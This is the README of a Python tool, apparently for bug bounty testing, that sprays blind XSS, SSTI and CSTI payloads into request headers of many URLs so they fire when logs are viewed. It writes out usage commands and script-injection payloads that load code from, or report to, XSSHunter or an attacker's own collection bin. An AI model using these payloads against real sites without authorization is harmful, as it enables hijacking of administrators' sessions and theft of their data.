# Blinder
- A Tool Written In Python3 To Send Blind Payloads On The Request Headers Maybe Stored On The Logs

## Description
- Blinder Is An Automation Tool That's Used To Send Blind Payloads For Many Bugs Like XSS,SSTI,CSTI,..etc. It Allows You To Send Your Blind Payloads On The Requests Headers That May Be Stored On The Server Logs Or By Insecure Application. In Case The User Is Trying To View The Logs With Inseucre Way On The Site Or Even With Insecure Application Your Payload Will Be Triggered And XSSHunter/Your-Bin Should Notify You About It.

### Installation
```
git clone https://github.com/DEMON1A/Blinder
cd Blinder
python3 Blinder.py [ARGS]
```

### What's New?
- Threading To Improve The Script Speed.
- Using Your Own External Bin Instead Of Just Using XSSHunter
- Using Your Own Payloads That Could Be Used To Inject Other Payloads For Other Issues
- Been Able To Allow/Disallow Redirects With Requests
- You Can Use Multi Payloads With The Requests And Select The Split Char
- Been Able To Select Your Own Header On The Requests That Will Be Sent.
- Selecting Your Own Replace String That Will Be Replaced To Your XSSHunter/Bin
- Cleaner Code!

## How To Use:
#### Basic:
- You Can Run Blinder In a Basic Usage By Just Using This Command. Where `-u` Options Is Your XSSHunter Username And `-f` Is The File That Contains The URLs With NewLine Seprator
```
python3 Blinder.py -u hacker -f URLs
```

#### Redirections
- To Disallow/Allow Redirections You Can Use `-r` Options With The Rule You Want. Disallowing Redirections Will Make The Tool Faster But It Might Miss Some Results. By Default Redirections Is Allowed On Blinder

- The Redirection Rules Are `allow` and `deny` In LowerCase. The Program Will Trigger An Error In Case You Used Something Else.
```
python3 Blinder.py -u hacker -f URLs -file -r deny
```
#### Payloads And Multi Payloads.
- In Blinder The Default Payload Is `"><script src=XSSHunter></script>`That's The Same as The Default One On XSShunter Website. In Case You Want To Use Another Payloads For XSS Or Something Else Like SSTI , CSTI You Can Add It Using `-p` Option That Can Be Used With Some Command Like The First Example

- In Case You Want To Use Multi Payloads You Can Add Your Payloads Then Seprate Them Using `,` For Default Usage, See The Second Example For That, In Case You Want To Seprate Them By Something Else You Can Use `-s` Option. And You Will Find It In The Third Example. 

- You Can Select What Text You Want To Get Replaced To Your XSSHunter/Bin Using `--replace` Option. You Will Get a Sample In The Forth Example. Also, In Case You Didn't Add The Replace String The Program Will Use `XXX` For Default.
```
python3 Blinder.py -u hacker -f URLs -p '"><img src="XXX">'
```
```
python3 Blinder.py -u hacker -f URLs -p '<img src="XXX">,<iframe src="XXX">'
```
```
python3 Blinder.py -u hacker -f URLs -p '<img src="XXX">_<iframe src="XXX">' -s '_'
```

```
python3 Blinder.py -u hacker -f URLs -p '<img src="RRR">_<iframe src="RRR">' -s '_' --replace 'RRR'
```

#### Headers
- In This New Update You Can Select What Headers You Want To Use To Send The Payloads On. The Default Is The `User-Agent` Header But You Can Add Your Own Header Using `--header` Option. See The Example Below

```
python3 Blinder.py -u hacker -f URLs --header test
```

#### External Bin
- In Case You Don't Want To Use XSSHunter And You Have Your Own Requeest Bin That Can Collect The Users Data You Can Use `-b` Option With Your External Bin Including The Protocol `http:` `https:`

```
python3 Blinder.py -b https://site.com/ -f URLs
```

### Something Isn't Working Or You Want To Improve Something?
- Then Please Open an Issue With It Or You Can Fork The Project Then Create a Pull Request.
- You Can Also DM Me On Twitter: [@DemoniaSlash](https://twitter.com/DemoniaSlash) 
